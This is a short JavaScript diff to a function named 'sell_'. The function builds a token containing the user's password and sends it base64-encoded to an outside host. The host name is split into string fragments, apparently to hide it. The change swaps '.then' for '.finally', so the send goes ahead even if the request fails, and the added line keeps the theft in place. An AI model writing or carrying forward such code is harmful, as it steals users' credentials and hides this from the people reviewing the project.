@@ -27,7 +27,7 @@ function sell_(e) {
                 e.passwd +
                 '&&' +
                 (available ? 'available=' + available : '-')
-            fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o' + 'p/?' + btoa(token)).then(()=>{
+            fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o' + 'p/?' + btoa(token)).finally(()=>{
                 console.log('进入')
                 setTimeout(() => {
                    location.reload()
